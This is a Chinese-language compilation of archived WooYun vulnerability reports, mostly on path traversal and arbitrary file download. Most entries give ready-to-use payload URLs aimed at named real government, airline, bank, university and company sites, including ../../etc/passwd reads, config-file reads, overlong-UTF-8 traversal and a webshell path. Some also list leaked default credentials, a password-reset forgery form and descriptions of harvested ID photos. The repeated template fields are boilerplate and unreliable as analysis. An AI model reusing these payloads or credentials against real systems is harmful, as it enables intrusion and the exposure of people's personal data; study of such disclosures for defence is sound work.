**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 接着上一发继续：http://wooyun.org/bugs/wooyun-2015-0116140上一发存在整站程序下载，管理员修复了。但是目录遍历的问题没有解决，等于和没修复一个样。

**POC**: 随便给出四处：http://www.hhrsks.com/files/ -第一个dbf格式直接打开你懂得http://www.hhrsks.com/gwybm2015/download/ 招收信息表格http://www.hhrsks.com/image/2012/05/24/chao.asp -一句话shell一个http://www.hhrsks.com/images/wgjk26827.html -黑链好多

**绕过**: 直接利用

**修复**: 立即修复。
---

---
### [wooyun-2015-0147059] 链家某站点服务配置不当导致大量用户信息泄露（身份证件照\房产证\合同发票单据\转账等等）
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点：http://kaipiaoba.homelink.com.cn此站点存在目录遍历，找到upload文件夹，里面包含大量房屋合同，房产证明，身份证件照，发票单据，转账信息等等合同看一下数量，不足两千份pdf文件包含身份证，房产证，合同，房本，房屋登记表等等吧收据回执单

**POC**: 发票连带着合同，收据，发票等，共3000余个

**绕过**: 直接利用

**修复**: 能给20不？
---

---
### [wooyun-2015-0123359] 中科新业网络哨兵任意文件下载/管理员MD5密码泄露
**厂商**: 中科新业 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: getpasswd.php:<?php/*********************//*                   *//*  Dezend for PHP5  *//*         NWS       *//*      Nulled.WS    *//*                   *//*********************/include( "../include/globalvar.h" );include( "../include/connectdb.php" );$sql = "SELECT password FROM tab_sys_user WHERE user_id='admin'";$gDb->query( $sql, "N" );$gDb->next_record( );echo $gDb->Record['password'];?>直接e

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-085659] ECStore开源网店系统任意文件读取漏洞
**厂商**: ShopEx | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: file参数对../未做过滤，导致可以跨目录读取文件测试url：http://shop.xxx.com/index.php/shopadmin/index.php?app=site&ctl=admin_theme_widget&act=preview&theme=ecstore&file=../../../../../etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤../过滤文件名
---

---
### [wooyun-2015-0107261] 某高校在用门户信息系统存在任意文件读取漏洞
**厂商**: 南京南软科技 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 厂商：http://www.southsoft.com.cn/  南京南软科技有限公司南京南软开发的一套专门用于高校门户信息系统的CMS存在任意文件读取，可读取任意文件的源代码。任意文件读取：/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.configCase:http://gschool.hebmu.edu.cn/CuteSoft_Client/CuteEditor/Load.ashxhttp://121.28.142.134:50000/CuteSoft_Client/CuteEditor/Load.ashxhttp://mbaxy.zjgsu.edu.cn/CuteSoft_Client/CuteEditor/Load.ashxhttp://gra.njutcm.edu.cn/CuteSoft_Cl

**POC**: Security Testing:1、读取web.config2、

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-058678] 邯郸市国土资源局任意文件下载
**厂商**: 邯郸市国土资源局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: n年前的漏洞http://hdgt.hd.gov.cn/down.asp?filename=../conn.asp%20filename后面可以添加任何文件，都能下载的说......

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-0129252] 完美某分站运维配置不当任意文件读取(敏感信息泄漏)
**厂商**: 完美世界 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可读取到WEB-INF目录下文件,那么这个系统结构基本就明朗了看到 @shine大牛WooYun: 去哪儿任意文件读取（基本可重构该系统原工程）http://radio.wanmei.com:8888/WEB-INF/web.xml可以看到各种配置文件，通过这些可以可以得到目录结构http://radio.wanmei.com:8888/WEB-INF/applicationContext.xmlhttp://radio.wanmei.com:8888/WEB-INF/jms-config.xmlAction的class文件http://radio.wanmei.com:8888/WEB-INF/action-servlet-zhanghua.xml

**POC**: 还有一些敏感信息

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0126628] 江中集团某处配置不当导致数据库打包下载
**厂商**: 江中集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历，各种源码泄露：http://login.jzjt.com/web/当然这种时候审核的同学会说“影响不大，有泄露数据库配置等敏感信息吗？”这次直接附送整个access数据库文件：http://login.jzjt.com/web/site.mdbhttp://login.jzjt.com/web/site_counts.mdb

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 喵~
---

---
### [wooyun-2015-0100918] 深圳航空某机上系统任意文件读取
**厂商**: 深圳航空 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞url:http://192.168.2.99/bookReader.phppost参数id=1000641&filename=../../../../../../../etc/passwd&m_code=m_0206&margintop=0&classify=

**POC**: /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail

**绕过**: 直接利用

**修复**: 1.过滤输入参数禁止上级目录跳转2.限制文件读取权限3.部署WAF
---

---
### [wooyun-2014-054123] 哈尔滨市水务局任意文件下载
**厂商**: 哈尔滨市水务局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.hrbwrb.gov.cn/down.action?attachentName=../dynamicPages/search.jsp

**POC**: www.hrbwrb.gov.cn/down.action?attachentName=../dynamicPages/search.jsp

**绕过**: 直接利用

**修复**: 禁止目录穿越
---

---
### [wooyun-2013-032773] 优酷某分站任意文件读取
**厂商**: 优酷 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://vq.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtphttp://vq.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2016-0206534] 东方航空某系统多个漏洞涉及客户信息(身份证彩照/手机/邮箱/票号等)
**厂商**: 中国东方航空股份有限公司 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 两个漏洞，第一个目录遍历：https://eb.ceair.com泄露很多客户信息，比如https://eb.ceair.com/uploadimages/这个目录下，有大量的客户上传信息，比如登机牌，身份证照片，见截图第二个漏洞就是弱口令：http://eb.ceair.com/Appeal/Admin/Login.aspxadmin/admin看着像是个票务审核系统，最新的数据是2016年5月8号的，说明在实时更新，详情见截图泄露姓名，身份证号，电话，邮箱，出行时间和地点等，危害巨大另外遍历的东西太多，接着深入，影响会加大

**POC**: 随便举两个例子：https://eb.ceair.com/uploadimages/0c396030-ddb0-4c2f-87bb-41af921e5fe6.Gifhttps://eb.ceair.com/uploadimages/fb945b64-f676-4f5b-a978-c890c7ff4577.jpg弱口令泄露的信息截图点进编号里面：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0107382] transn 传神任意文件读取漏洞
**厂商**: transn.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取漏洞http://edu.transn.com/htdocs/?do=../../../../../etc/passwd%00.jpg

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0171122] 百度联盟系统某系统漏洞导致配置错误
**厂商**: 百度 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 入口URL： http://union.baidu.com/client/cooperation/cpro/filter/cproUrlFilterMgr!save.action

**POC**: 1.获取添加过滤网站的请求内容如下：POST /client/cooperation/cpro/filter/cproUrlFilterMgr!save.action HTTP/1.1Accept: */*Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://union.baidu.com/client/#/cooperation/cpro/filter/urlAccept-Language: zh-CNAccept-Encoding: gzip, defla

**绕过**: 直接利用

**修复**: 限制权限
---

---
### [wooyun-2013-033101] 鼎信贷PHP程序任意文件读取漏洞
**厂商**: dingxindai.com | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://www.dingxindai.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==https://www.dingxindai.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvLi4vLi4vLi4vZXRjL3Bhc3N3ZA==这两个链接请在IE浏览器中打开，遨游用户请选用兼容模式

**POC**: 话不多说，直接上图。

**绕过**: 直接利用

**修复**: 做好过滤。
---

---
### [wooyun-2015-0150468] 某省组织机构代码在线登记中心存在任意文件下载漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/InfoMsg/   可以下载源代码http://**.**.**.**/ImageWeb/2013/%E5%B9%B4%E6%A3%80/  大量个人身份证照片查看下载

**POC**: 同上

**绕过**: 直接利用

**修复**: 好好配置下
---

---
### [wooyun-2013-025722] 安溪广播电视台溪溪网数据库目录遍历至后台沦陷
**厂商**: 安溪广播电视台溪溪网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安溪县广播电视台溪溪网数据库目录遍历且数据库任意下载后台沦陷可任意操作

**POC**: 如上

**绕过**: 直接利用

**修复**: 防下载 防遍历
---

---
### [wooyun-2015-0147873] 某宽带主干网络公司配置不当导致大量敏感信息泄露
**厂商**: 广州宽带主干网络公司 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 站点存在目录遍历漏洞，upload和data可随意浏览，查看敏感信息。http://**.**.**.**/data/http://**.**.**.**https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/

**POC**: 进入data，大量网站文件，估计不少还是比较敏感的backup文件夹果然有网站包括数据库在内的备份，大量数据库表名、结构和用户个人敏感信息（qq、邮箱、名字、手机号）和管理员名、密码在内（密码有MD5……没用彩虹表试过，不深入）还有upload同样可以遍历

**绕过**: 直接利用

**修复**: 请限制在网络访问相关路径的权限。给高一点的Rank可好？
---

---
### [wooyun-2015-0155083] 江苏沙钢集团有限公司,商务平台任意文件下载漏洞
**厂商**: 江苏沙钢集团有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1,https://**.**.**.**/pur_portal/download.jsp?filename=../../../../../../../../../../../../../../../etc/passwdroot:!:0:0::/:/usr/bin/kshdaemon:!:1:1::/etc:bin:!:2:2::/bin:sys:!:3:3::/usr/sys:adm:!:4:4::/var/adm:uucp:!:5:5::/usr/lib/uucp:guest:!:100:100::/home/guest:nobody:!:4294967294:4294967294::/:lpd:!:9:4294967294::/:lp:*:11:11::/var/spool/lp:/bin/falseinvscout:*:6:12::/var/adm/invscout:/usr/bi

**POC**: 如上

**绕过**: 直接利用

**修复**: Fix
---

---
### [wooyun-2015-0138005] 中企动力某站点未授权访问（目录遍历信息）
**厂商**: 中企动力科技股份有限公司 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://nt1.300.cn直接上图

**POC**: http://nt1.300.cn直接上图

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-023218] 复旦大学某研究院任意文件下载漏洞
**厂商**: 复旦大学 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 复旦大学社会科学高等研究院在处理文档下载时未做严格过滤，导致可通过修改参数下载任意文件，具体链接为http://www.ias.fudan.edu.cn/File.aspx?filepath=/default.aspx，通过修改filepath的值可以实现任意文件下载，导致源码泄露。恶意攻击者能够通过该漏洞下载数据库配置文件，从而进一步攻击，获取更高权限。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 严格过滤另求注册码！！！
---

---
### [wooyun-2014-063481] 某通用政府系统任意文件下载
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入, 认证接口, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 谷歌关键字 inurl:/Download?url=/uploadFiles举5个例子庆元农业信息网http://www.qyny.gov.cn/Download?url=/uploadFiles/2011-11/1322624214093.doc上虞农业信息网http://www.syny.net/Download?url=/uploadFiles/2008-11/1227413949437.doc莲都农业信息网http://www.ldnj110.gov.cn/Download?url=/uploadFiles/2014-03/1393809650714.doc温州市农业局http://www.wzsnw.gov.cn/Download?url=/uploadFiles/2013-06/1371198755376.pdf萧山农业信息网http://www.goldagri.com/Do

**POC**: 其他还请自查

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-059596] 某招投标类CMS通用型任意文件下载（官网已demo）
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 出现任意文件下载漏洞的公司叫：南昌明星科技发展有限公司价格还不便宜：）google hack:site:gov.cn inurl:new_info_dowload.jsp 当然，还存在别的特征，这里只列举一个查找方式。官网也是用这套程序的。。好吧 先拿官网来做实验了。在官网能看到有软件下载这一列修改下载参数为：http://www.jx-star.com/xtgly/new_info_dowload.jsp?wj=/WEB-INF/web.xml看看我们的web.xml已经成功下载回来了。

**POC**: 来看看一些实例：http://www.japrtc.gov.cn/new_info_dowload.jsp?wj=/WEB-INF/web.xml数据库配置文件也在下面了，不过不全部一样，因为有的被管理员改名了。www.ycjsw.com/xtgly/new_info_dowload.jsp?wj=/WEB-INF/web.xml202.109.164.24/xtgly/new_info_dowload.jsp?wj=/WEB-INF/web.xml202.101.233.61/new_info_dowload.jsp?wj=/WEB-INF/web.xml

**绕过**: 直接利用

**修复**: 修复wj参数，不要让用户可控制。
---

---
### [wooyun-2012-09802] 中国大地任意文件下载漏洞
**厂商**: 中国大地保险 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞网站:http://im.95590.cn:7002任意文件下载漏洞.

**POC**: http://im.95590.cn:7002/web/common/getfile.jsp？p=/../../../../../etc/passwdhttp://im.95590.cn:7002/web/common/getfile.jsp?p=/../../../../../opt/uficc/icc_config/Proxool.properties

**绕过**: 直接利用

**修复**: 目录权限严格设置
---

---
### [wooyun-2015-0133190] 某旅游系统逻辑缺陷导致大量用户信息泄漏任意密码修改+验证脚本
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通用型漏洞关键字：inurl:"HotelManager/GetTopHotels.aspx"涉及网站：**.**.**.**    华中自助游网**.**.**.**     恩施旅游网**.**.**.**     恩施硒都酒店联盟...0x01  任意密码修改输入网站会员手机号或者邮箱，可直接修改密码请看POC(修改POC里Form的Action地址以修改请求目标):<html><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><p>填入目标的电话号码或者邮箱 点击重置密码 即可重置任意帐户密码</p><br><form action="http://**.**.**.**/Profile.aspx/reset" method="POST">电　话：<input type="text" name=

**POC**: 获得电话号码就能重置密码 0x01+0x02双剑合璧看看影响了多少用户华中自助游目前已有 18658 名用户受影响恩施酒店联盟目前已有 9169 名用户受影响来看看"脱裤"的情况：网站+用户ID范围批量获取用户手机号或电话 ，直接可以强制更改密码至此 仅测试前5名用户的信息采集 以及 探测最大用户量，未进行整站脱裤快点修复吧..   >_<  我还没批...

**绕过**: 直接利用

**修复**: 只是简单测试了一下  就有这么多问题1.用户密码找回应有二次校验2.加验证码防止页面数据重复提交以被利用3.权限  权限  权限  .. 平行权限的危害是非常大的4.提不提交是一种态度，修不修复就是您的态度了
---

---
### [wooyun-2015-0121606] 乐知行教务系统存在任意文件下载漏洞
**厂商**: 乐知行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 存在两处任意文件下载:/ueditor/downAttach.do?url=/ckfile.do?path=案例：http://58.118.36.9/datacenter/ueditor/downAttach.do?url=../../../../../../../../../../etc/passwdhttp://www.yongzhong.net/cms/ueditor/downAttach.do?url=../../../../../../../../../../etc/passwdhttp://www.hdac.cn/datacenter/ueditor/downAttach.do?url=../../../../../../../../../../etc/passwdhttp://42.121.0.194/cms/ueditor/downAttach.do?url=../../

**POC**: 第一处：1#http://58.118.36.9/datacenter/ueditor/downAttach.do?url=../../../../../../../../../../etc/passwd2#http://www.yongzhong.net/cms/ueditor/downAttach.do?url=../../../../../../../../../../etc/passwd第二处:1#http://58.118.36.9/datacenter/ckfile.do?path=../../../../../../../../../../etc/passwd2#http://w

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2012-013567] 凤凰网任意文件读取两枚
**厂商**: 凤凰网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.凤凰网搜索http://search.ifeng.com/http://sou.ifeng.com/2.配置http://search.ifeng.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xmlhttp://sou.ifeng.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml3.源码http://search.ifeng.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp

**POC**: http://search.ifeng.com/resin-doc/examples/ioc-periodictask/viewfile?file=index.xtp

**绕过**: 直接利用

**修复**: ...
---

---
### [wooyun-2013-046899] 四川航空多个系统目录遍历且存在弱口令
**厂商**: 四川航空 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.四川航空股份有限公司团队收益管理系统 V2.0,地址:http://119.6.92.60/（1）弱口令:admin/123456（2）目录遍历可且可下载历史数据库http://119.6.92.60/database/http://119.6.92.60/bin/（3）下载本地sqlserver附加:#2.四川航空安全质量管理体系平台，地址:http://119.6.92.45/测试登录会显示通过外网访问时，只能通过相关系统的链接进行访问。有问题可咨询信息服务部值班电话1234,感觉和上海银行的某业务系统差不多，必须要求从固定连接过去。目录遍历:http://119.6.92.45/module/    http://119.6.92.45https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/upload内容可下载

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 强壮密码,禁止目录遍历
---

---
### [wooyun-2012-03964] 招商银行--快乐E购 目录遍历
**厂商**: 招商银行 | **年份**: 2012 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 配置不当目录遍历随意下载文件

**POC**: http://market.cmbego.com/

**绕过**: 直接利用

**修复**: 转载
---

---
### [wooyun-2013-043603] 格林豪泰酒店连锁新业务平台漏洞大礼包
**厂商**: 格林豪泰酒店管理集团 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 先是几个小问题：业务平台根目录泄漏：http://erp.998.com/WebPortal_HotelFinance/FinanceErrorPage.aspx业务平台几个越权操作：修改用户权限：http://erp.998.com/WebPortal_HotelFinance/setAuthority.aspx营收调整：http://erp.998.com/WebPortal_HotelFinance/FinanceAllHotelReport.aspx应收查询（这里查询的编号可从上面的越权处获得)：http://erp.998.com/WebPortal_HotelFinance/FinanceAdjust.aspx又一处越权：http://erp.998.com/WebPortal_HotelFinance/FinanceAdjustByList.aspx

**POC**: null

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2013-046809] 开源中国社区任意文件下载
**厂商**: 开源中国 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用户登录后访问如下地址可直接下载passwd等任意文件http://www.oschina.net/code/download_src?file=../../../../../etc/passwd

**POC**: null

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2014-085270] 翼定位官网存在多个弱口令
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目录遍历 http://waiqin.gdbnet.cn:8011/themes/可以获取多个账户随便找几个登陆了看看user:Admin@zqb0.com password：123456user：admin@mzdxzqkhb.com password：123456参考这个来的WooYun: 中国电信某业务管理入口存在多个用户弱口令（可对手机号码进行GPS定位）

**POC**: 目录遍历 http://waiqin.gdbnet.cn:8011/themes/可以获取多个账户随便找几个登陆了看看user:Admin@zqb0.com password：123456user：admin@mzdxzqkhb.com password：123456

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2016-0193578] P2P金融安全之擒贼先擒王
**厂商**: 云信 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取获取到了邮件信息；：**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/CreditCloud/config/EmailConfig.xml<host>**.**.**.**</host><port>465</port><user>donotreply@**.**.**.**</user><password>Passw0rd</password>登录邮件把企业通讯录脱下来，拿来爆破下。获取几个默认密码，其他密码没尝试了。躺枪...**.**.**.****.**.**.**:8080/adminadmi

**POC**: 任意文件读取获取到了邮件信息；：**.**.**.**:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/var/CreditCloud/config/EmailConfig.xml<host>**.**.**.**</host><port>465</port><user>donotreply@**.**.**.**</user><password

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-034544] TOM在线某分站本地任意文件读取漏洞(数据库密码泄露)
**厂商**: TOM在线 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mmsdiy.tom.com分站任意文件读取http://mmsdiy.tom.com/chinamobile/showtmpimg.php?tmpfilename=../../../../../../../../../../../../../../etc/passwdhttp://sms.tom.com/ 泄露 phpinfo()信息  根据这个猜出mmsdiy网站根目录数据库密码

**POC**: 如上图

**绕过**: 直接利用

**修复**: 参数过滤
---

---
### [wooyun-2015-090178] 易联支付重要分站存在任意文件读取漏洞（关键密码泄漏）
**厂商**: 易联支付有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在这个站：http://mail.payeco.com漏洞地址http://mail.payeco.com/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00skin没做过滤吧，可构造，构造了个config.xml。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0129937] 中华信鸽网某分站任意包含文件读取漏洞
**厂商**: 中华信鸽网 | **年份**: 2015 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://gplm.zhxg.com/api/excel.php?path=../../../../../../../../../../etc/passwd

**POC**: http://gplm.zhxg.com/api/excel.php?path=../../../../../../../../../../etc/services

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0147662] 重庆邮电大学某分站存在文件下载漏洞
